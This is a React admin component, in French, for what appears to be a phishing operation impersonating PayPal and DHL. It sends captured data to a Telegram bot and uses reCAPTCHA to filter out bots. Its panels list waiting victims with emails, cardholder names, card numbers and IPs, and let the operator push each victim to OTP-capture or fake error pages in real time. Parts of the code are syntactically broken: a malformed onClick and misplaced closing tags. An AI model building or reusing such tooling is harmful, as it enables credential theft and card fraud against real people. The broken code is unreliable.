import { useState, useEffect } from "react";
import { useQuery, useMutation } from "@tanstack/react-query";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { Send, Save, CheckCircle2, Users, ExternalLink, XCircle, Shield, Eye } from "lucide-react";
import { apiRequest, queryClient } from "@/lib/queryClient";
import { Switch } from "@/components/ui/switch";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import VisitorTracking from "./VisitorTracking";

interface TelegramConfig {
  telegramBotToken: string;
  telegramChatId: string;
  redirectUrl?: string;
  redirectEnabled?: string;
  recaptchaSiteKey?: string;
  recaptchaSecretKey?: string;
  recaptchaEnabled?: string;
  recaptchaThreshold?: string;
}

interface AdminPanelProps {
  onSave?: (config: TelegramConfig) => void;
  onTest?: (config: TelegramConfig) => void;
}

export default function AdminPanel({ onSave, onTest }: AdminPanelProps) {
  const [config, setConfig] = useState<TelegramConfig>({
    telegramBotToken: "",
    telegramChatId: "",
    redirectUrl: "",
    redirectEnabled: "false",
    recaptchaSiteKey: "",
    recaptchaSecretKey: "",
    recaptchaEnabled: "false",
    recaptchaThreshold: "0.5",
  });
  const { toast } = useToast();

  const { data: settings } = useQuery<TelegramConfig & { updatedAt?: Date }>({
    queryKey: ["/api/admin/settings"],
  });

  useEffect(() => {
    if (settings) {
      setConfig({
        telegramBotToken: settings.telegramBotToken || "",
        telegramChatId: settings.telegramChatId || "",
        redirectUrl: settings.redirectUrl || "",
        redirectEnabled: settings.redirectEnabled || "false",
        recaptchaSiteKey: settings.recaptchaSiteKey || "",
        recaptchaSecretKey: settings.recaptchaSecretKey || "",
        recaptchaEnabled: settings.recaptchaEnabled || "false",
        recaptchaThreshold: settings.recaptchaThreshold || "0.5",
      });
    }
  }, [settings]);

  const saveMutation = useMutation({
    mutationFn: async (data: TelegramConfig) => {
      await apiRequest("POST", "/api/admin/settings", data);
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/settings"] });
      onSave?.(config);
      toast({
        title: "Configuration sauvegardée",
        description: "Les paramètres Telegram ont été enregistrés avec succès.",
      });
    },
    onError: () => {
      toast({
        title: "Erreur",
        description: "Impossible de sauvegarder les paramètres.",
        variant: "destructive",
      });
    },
  });

  const testMutation = useMutation({
    mutationFn: async (data: TelegramConfig) => {
      await apiRequest("POST", "/api/admin/test-telegram", {
        botToken: data.telegramBotToken,
        chatId: data.telegramChatId,
      });
    },
    onSuccess: () => {
      onTest?.(config);
      toast({
        title: "Test de connexion",
        description: "Message de test envoyé sur Telegram avec succès.",
      });
    },
    onError: () => {
      toast({
        title: "Erreur de test",
        description: "Impossible d'envoyer le message de test. Vérifiez vos paramètres.",
        variant: "destructive",
      });
    },
  });

  const handleSave = () => {
    saveMutation.mutate(config);
  };

  const handleTest = () => {
    testMutation.mutate(config);
  };

  return (
    <div className="space-y-6 p-6">
      <div>
        <h1 className="text-3xl font-bold" data-testid="text-admin-title">Panneau d'Administration</h1>
        <p className="text-muted-foreground mt-1">
          Gérez vos paramètres et surveillez vos visiteurs en temps réel
        </p>
      </div>

      <Tabs defaultValue="settings" className="w-full">
        <TabsList className="grid w-full max-w-md grid-cols-2">
          <TabsTrigger value="settings" data-testid="tab-settings">
            <Shield className="h-4 w-4 mr-2" />
            Paramètres
          </TabsTrigger>
          <TabsTrigger value="visitors" data-testid="tab-visitors">
            <Eye className="h-4 w-4 mr-2" />
            Visiteurs
          </TabsTrigger>
        </TabsList>

        <TabsContent value="settings" className="space-y-6 mt-6">
      <Card>
        <CardHeader>
          <CardTitle>Intégration Telegram</CardTitle>
          <CardDescription>
            Configurez votre bot Telegram pour recevoir les notifications de paiement
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-6">
          <div className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="botToken">Bot Token</Label>
              <Input
                id="botToken"
                data-testid="input-bot-token"
                type="text"
                placeholder="1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
                value={config.telegramBotToken}
                onChange={(e) => setConfig({ ...config, telegramBotToken: e.target.value })}
                className="font-mono text-sm h-12"
              />
              <p className="text-xs text-muted-foreground">
                Obtenez votre token auprès de @BotFather sur Telegram
              </p>
            </div>

            <div className="space-y-2">
              <Label htmlFor="chatId">Chat ID</Label>
              <Input
                id="chatId"
                data-testid="input-chat-id"
                type="text"
                placeholder="-1001234567890"
                value={config.telegramChatId}
                onChange={(e) => setConfig({ ...config, telegramChatId: e.target.value })}
                className="font-mono text-sm h-12"
              />
              <p className="text-xs text-muted-foreground">
                ID du chat ou canal où recevoir les notifications
              </p>
            </div>
          </div>

          <div className="flex gap-3">
            <Button
              onClick={handleTest}
              variant="secondary"
              disabled={!config.telegramBotToken || !config.telegramChatId || testMutation.isPending}
              data-testid="button-test-connection"
              className="flex-1"
            >
              <Send className="mr-2 h-4 w-4" />
              {testMutation.isPending ? "Test en cours..." : "Tester la connexion"}
            </Button>
            <Button
              onClick={handleSave}
              disabled={saveMutation.isPending}
              data-testid="button-save-config"
              className="flex-1"
            >
              <Save className="mr-2 h-4 w-4" />
              {saveMutation.isPending ? "Enregistrement..." : "Sauvegarder"}
            </Button>
          </div>
        </CardContent>
      </Card>

      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Shield className="h-5 w-5" />
            Protection Anti-Bot (reCAPTCHA v3)
          </CardTitle>
          <CardDescription>
            Bloquez automatiquement les visiteurs non-humains avec Google reCAPTCHA v3
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-6">
          <div className="flex items-center justify-between p-4 bg-muted/50 rounded-lg">
            <div className="space-y-1">
              <Label htmlFor="recaptcha-enabled" className="text-base font-medium">
                Activer reCAPTCHA
              </Label>
              <p className="text-xs text-muted-foreground">
                Protection invisible contre les bots
              </p>
            </div>
            <Switch
              id="recaptcha-enabled"
              data-testid="switch-recaptcha-enabled"
              checked={config.recaptchaEnabled === "true"}
              onCheckedChange={(checked) => 
                setConfig({ ...config, recaptchaEnabled: checked ? "true" : "false" })
              }
            />
          </div>

          <div className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="recaptchaSiteKey">Site Key (Client)</Label>
              <Input
                id="recaptchaSiteKey"
                data-testid="input-recaptcha-site-key"
                type="text"
                placeholder="6LeXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
                value={config.recaptchaSiteKey || ""}
                onChange={(e) => setConfig({ ...config, recaptchaSiteKey: e.target.value })}
                className="font-mono text-sm h-12"
                disabled={config.recaptchaEnabled !== "true"}
              />
              <p className="text-xs text-muted-foreground">
                Clé publique pour le frontend (commence par "6Le...")
              </p>
            </div>

            <div className="space-y-2">
              <Label htmlFor="recaptchaSecretKey">Secret Key (Serveur)</Label>
              <Input
                id="recaptchaSecretKey"
                data-testid="input-recaptcha-secret-key"
                type="password"
                placeholder="6LeXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
                value={config.recaptchaSecretKey || ""}
                onChange={(e) => setConfig({ ...config, recaptchaSecretKey: e.target.value })}
                className="font-mono text-sm h-12"
                disabled={config.recaptchaEnabled !== "true"}
              />
              <p className="text-xs text-muted-foreground">
                Clé secrète pour la vérification backend (ne jamais partager)
              </p>
            </div>

            <div className="space-y-2">
              <Label htmlFor="recaptchaThreshold">Seuil de Détection (Score)</Label>
              <div className="flex items-center gap-4">
                <Input
                  id="recaptchaThreshold"
                  data-testid="input-recaptcha-threshold"
                  type="number"
                  min="0"
                  max="1"
                  step="0.1"
                  placeholder="0.5"
                  value={config.recaptchaThreshold || "0.5"}
                  onChange={(e) => setConfig({ ...config, recaptchaThreshold: e.target.value })}
                  className="h-12 w-24"
                  disabled={config.recaptchaEnabled !== "true"}
                />
                <div className="flex-1">
                  <p className="text-sm font-medium">
                    {parseFloat(config.recaptchaThreshold || "0.5") >= 0.7 ? "🟢 Strict (Recommandé)" : 
                     parseFloat(config.recaptchaThreshold || "0.5") >= 0.5 ? "🟡 Modéré" : 
                     "🔴 Permissif"}
                  </p>
                  <p className="text-xs text-muted-foreground">
                    0.0 = bot certain, 1.0 = humain certain
                  </p>
                </div>
              </div>
            </div>
          </div>

          <div className="p-4 bg-blue-50 dark:bg-blue-950/20 rounded-lg border border-blue-200 dark:border-blue-900">
            <p className="text-sm text-blue-900 dark:text-blue-100 font-medium mb-2">
              📝 Comment obtenir vos clés reCAPTCHA:
            </p>
            <ol className="text-xs text-blue-800 dark:text-blue-200 space-y-1 list-decimal list-inside">
              <li>Visitez: <a href="https://www.google.com/recaptcha/admin/create" target="_blank" rel="noopener noreferrer" className="underline font-mono">google.com/recaptcha/admin/create</a></li>
              <li>Choisissez "reCAPTCHA v3" et ajoutez votre domaine (celio.store)</li>
              <li>Copiez la "Site Key" et la "Secret Key" ici</li>
            </ol>
          </div>

          <Button
            onClick={handleSave}
            disabled={saveMutation.isPending}
            data-testid="button-save-recaptcha"
            className="w-full"
          >
            <Save className="mr-2 h-4 w-4" />
            {saveMutation.isPending ? "Enregistrement..." : "Sauvegarder la configuration reCAPTCHA"}
          </Button>
        </CardContent>
      </Card>

      <Card>
        <CardHeader>
          <CardTitle>Contrôle de redirection</CardTitle>
          <CardDescription>
            Redirigez automatiquement les visiteurs vers n'importe quelle page
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="space-y-2">
            <Label htmlFor="redirectUrl">URL de redirection</Label>
            <Input
              id="redirectUrl"
              data-testid="input-redirect-url"
              type="url"
              placeholder="https://exemple.com/page"
              value={config.redirectUrl || ""}
              onChange={(e) => setConfig({ ...config, redirectUrl: e.target.value })}
              className="h-12"
            />
            <p className="text-xs text-muted-foreground">
              Les visiteurs seront redirigés vers cette URL après avoir complété le formulaire
            </p>
          </div>

          <div className="flex items-center gap-3">
            <input
              type="checkbox"
              id="redirectEnabled"
              data-testid="checkbox-redirect-enabled"
              checked={config.redirectEnabled === "true"}
              onChange={(e) => setConfig({ ...config, redirectEnabled: e.target.checked ? "true" : "false" })}
              className="h-4 w-4 rounded border-border"
            />
            <Label htmlFor="redirectEnabled" className="cursor-pointer font-normal">
              Activer la redirection automatique
            </Label>
          </div>
        </CardContent>
      </Card>

      <Card>
        <CardHeader>
          <CardTitle>État de la connexion</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-1">
              <p className="text-sm text-muted-foreground">Statut</p>
              <div className="flex items-center gap-2">
                <CheckCircle2 
                  className={`h-4 w-4 ${config.telegramBotToken && config.telegramChatId ? 'text-green-500' : 'text-muted-foreground'}`} 
                  data-testid="icon-status" 
                />
                <span className="font-medium" data-testid="text-status">
                  {config.telegramBotToken && config.telegramChatId ? 'Configuré' : 'Non configuré'}
                </span>
              </div>
            </div>
            <div className="space-y-1">
              <p className="text-sm text-muted-foreground">Dernière mise à jour</p>
              <p className="font-medium" data-testid="text-last-sync">
                {settings?.updatedAt ? new Date(settings.updatedAt).toLocaleString('fr-FR') : 'Jamais'}
              </p>
            </div>
          </div>
        </CardContent>
      </Card>

      <WaitingPayPalSessionsPanel />
      <WaitingDHLSessionsPanel />
    </div>
  );
}

interface PaypalSession {
  id: string;
  sessionId: string;
  email: string;
  country?: string;
  ipAddress?: string;
  device?: string;
  browser?: string;
  status: string;
  redirectVersion?: number;
  currentPath?: string;
  redirectUrl?: string;
  createdAt: Date;
}

interface DhlSession {
  id: string;
  sessionId: string;
  cardholderName: string;
  cardNumber: string;
  country?: string;
  ipAddress?: string;
  device?: string;
  browser?: string;
  status: string;
  redirectVersion?: number;
  currentPath?: string;
  redirectUrl?: string;
  createdAt: Date;
}

function WaitingPayPalSessionsPanel() {
  const { toast } = useToast();

  const { data: sessions, refetch } = useQuery<PaypalSession[]>({
    queryKey: ["/api/admin/paypal-sessions"],
    refetchInterval: 3000,
  });

  const redirectMutation = useMutation({
    mutationFn: async ({ sessionId, url }: { sessionId: string; url: string }) => {
      await apiRequest("POST", `/api/admin/paypal-sessions/${sessionId}/redirect`, {
        redirectUrl: url,
      });
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/paypal-sessions"] });
      toast({
        title: "Redirection envoyée",
        description: "Le client sera redirigé automatiquement.",
      });
    },
    onError: () => {
      toast({
        title: "Erreur",
        description: "Impossible d'envoyer la redirection.",
        variant: "destructive",
      });
    },
  });

  const handleRedirect = (sessionId: string, url: string) => {
    redirectMutation.mutate({ sessionId, url });
  };

  if (!sessions || sessions.length === 0) {
    return null;
  }

  return (
    <Card>
      <CardHeader>
        <div className="flex items-center gap-2">
          <Users className="h-5 w-5" />
          <CardTitle>PayPal - Sessions en attente</CardTitle>
        </div>
        <CardDescription>
          {sessions.length} {sessions.length === 1 ? 'client attend' : 'clients attendent'} votre décision
        </CardDescription>
      </CardHeader>
      <CardContent>
        <div className="space-y-4">
          {sessions.map((session) => (
            <Card key={session.id} className="border-2 border-yellow-500">
              <CardContent className="pt-6">
                <div className="space-y-4">
                  <div className="grid grid-cols-2 gap-3 text-sm">
                    <div>
                      <p className="text-muted-foreground">Email</p>
                      <p className="font-medium" data-testid={`text-email-${session.sessionId}`}>
                        {session.email}
                      </p>
                    </div>
                    <div>
                      <p className="text-muted-foreground">Session</p>
                      <p className="font-mono text-xs" data-testid={`text-session-${session.sessionId}`}>
                        {session.sessionId}
                      </p>
                    </div>
                    <div>
                      <p className="text-muted-foreground">Pays</p>
                      <p className="font-medium">{session.country || 'Unknown'}</p>
                    </div>
                    <div>
                      <p className="text-muted-foreground">IP</p>
                      <p className="font-mono text-xs">{session.ipAddress || 'Unknown'}</p>
                    </div>
                    <div>
                      <p className="text-muted-foreground">Appareil</p>
                      <p className="font-medium">{session.device || 'Unknown'}</p>
                    </div>
                    <div>
                      <p className="text-muted-foreground">Navigateur</p>
                      <p className="font-medium">{session.browser || 'Unknown'}</p>
                    </div>
                  </div>

                  <div className="flex gap-2 pt-2">
                    <Button
                      onClick={() => handleRedirect(session.sessionId, '/paypal/otp')}
                      className="flex-1 bg-green-600 hover:bg-green-700"
                      data-testid={`button-otp-${session.sessionId}`}
                    >
                      <ExternalLink className="mr-2 h-4 w-4" />
                      OTP
                    </Button>
                    <Button
                      onClick={() => handleRedirect(session.sessionId, '/paypal/failure')}
                      className="flex-1 bg-red-600 hover:bg-red-700"
                      data-testid={`button-failure-${session.sessionId}`}
                      variant="destructive"
                    >
                      <XCircle className="mr-2 h-4 w-4" />
                      LOGIN ERROR
                    </Button>
                  </div>
                </div>
              </CardContent>
            </Card>
          ))}
        </div>
      </CardContent>
    </Card>
  );
}

function WaitingDHLSessionsPanel() {
  const { toast } = useToast();
  const [customUrls, setCustomUrls] = useState<Record<string, string>>({});

  const { data: sessions } = useQuery<DhlSession[]>({
    queryKey: ["/api/admin/dhl-sessions"],
    refetchInterval: 3000,
  });

  const redirectMutation = useMutation({
    mutationFn: async ({ sessionId, url }: { sessionId: string; url: string }) => {
      console.log('[Admin] Sending redirect:', { sessionId, url });
      const result = await apiRequest("POST", `/api/admin/dhl-sessions/${sessionId}/redirect`, {
        redirectUrl: url,
      });
      console.log('[Admin] Redirect response:', result);
      return result;
    },
    onSuccess: (data) => {
      console.log('[Admin] Redirect success, invalidating queries');
      queryClient.invalidateQueries({ queryKey: ["/api/admin/dhl-sessions"] });
      toast({
        title: "Redirection envoyée",
        description: "Le client sera redirigé automatiquement.",
      });
    },
    onError: (error) => {
      console.error('[Admin] Redirect error:', error);
      toast({
        title: "Erreur",
        description: "Impossible d'envoyer la redirection.",
        variant: "destructive",
      });
    },
  });

  const handleRedirect = (sessionId: string, url: string) => {
    redirectMutation.mutate({ sessionId, url });
  };

  const handleCustomRedirect = (sessionId: string) => {
    const url = customUrls[sessionId];
    if (url && url.trim()) {
      handleRedirect(sessionId, url.trim());
      setCustomUrls({ ...customUrls, [sessionId]: "" }); // Clear input after redirect
    }
  };

  if (!sessions || sessions.length === 0) {
    return null;
  }

  return (
    <Card>
      <CardHeader>
        <div className="flex items-center gap-2">
          <Users className="h-5 w-5" />
          <CardTitle>DHL - Sessions en attente</CardTitle>
        </div>
        <CardDescription>
          {sessions.length} {sessions.length === 1 ? 'client attend' : 'clients attendent'} votre décision
        </CardDescription>
      </CardHeader>
      <CardContent>
        <div className="space-y-4">
          {sessions.map((session) => (
            <Card key={session.id} className="border-2 border-yellow-500">
              <CardContent className="pt-6">
                <div className="space-y-4">
                  <div className="grid grid-cols-2 gap-3 text-sm">
                    <div>
                      <p className="text-muted-foreground">Nom</p>
                      <p className="font-medium" data-testid={`text-name-${session.sessionId}`}>
                        {session.cardholderName}
                      </p>
                    </div>
                    <div>
                      <p className="text-muted-foreground">Session</p>
                      <p className="font-mono text-xs" data-testid={`text-session-${session.sessionId}`}>
                        {session.sessionId}
                      </p>
                    </div>
                    <div>
                      <p className="text-muted-foreground">Carte</p>
                      <p className="font-mono text-xs">
                        **** {session.cardNumber.slice(-4)}
                      </p>
                    </div>
                    <div>
                      <p className="text-muted-foreground">Page actuelle</p>
                      <p className="font-mono text-xs text-blue-600">
                        {session.currentPath || '/dhl/waiting'}
                      </p>
                    </div>
                    <div>
                      <p className="text-muted-foreground">Redirections</p>
                      <p className="font-medium">
                        v{session.redirectVersion || 0}
                      </p>
                    </div>
                    <div>
                      <p className="text-muted-foreground">Pays</p>
                      <p className="font-medium">{session.country || 'Unknown'}</p>
                    </div>
                  </div>

                  {/* Custom URL Input */}
                  <div className="pt-2 border-t">
                    <Label htmlFor={`custom-url-${session.sessionId}`} className="text-sm text-muted-foreground">
                      URL personnalisée
                    </Label>
                    <div className="flex gap-2 mt-2">
                      <Input
                        id={`custom-url-${session.sessionId}`}
                        data-testid={`input-custom-redirect-${session.sessionId}`}
                        type="text"
                        placeholder="/approve, /otp1, /error, /success..."
                        value={customUrls[session.sessionId] || ""}
                        onChange={(e) => setCustomUrls({ ...customUrls, [session.sessionId]: e.target.value })}
                        className="flex-1"
                      />
                      <Button
                        onClick={() => handleCustomRedirect(session.sessionId)}
                        disabled={!customUrls[session.sessionId]?.trim()}
                        variant="outline"
                        data-testid={`button-custom-redirect-${session.sessionId}`}
                      >
                        <ExternalLink className="mr-2 h-4 w-4" />
                        Rediriger
                      </Button>
                    </div>
                  </div>

                  <div className="flex gap-2 pt-2">
                    <Button
                      onClick={() => handleRedirect(session.sessionId, '/otp1')}
                      className="flex-1 bg-green-600 hover:bg-green-700"
                      data-testid={`button-dhl-otp-${session.sessionId}`}
                    >
                      <ExternalLink className="mr-2 h-4 w-4" />
                      OTP
                    </Button>
                    <Button
                      onClick(() => handleRedirect(session.sessionId, '/error')}
                      className="flex-1 bg-red-600 hover:bg-red-700"
                      data-testid={`button-dhl-error-${session.sessionId}`}
                      variant="destructive"
                    >
                      <XCircle className="mr-2 h-4 w-4" />
                      ERROR
                    </Button>
                  </div>
                </div>
              </CardContent>
            </Card>
          ))}
        </div>
      </CardContent>
    </Card>
        </TabsContent>

        <TabsContent value="visitors" className="mt-6">
          <VisitorTracking />
        </TabsContent>
      </Tabs>
    </div>
  );
}
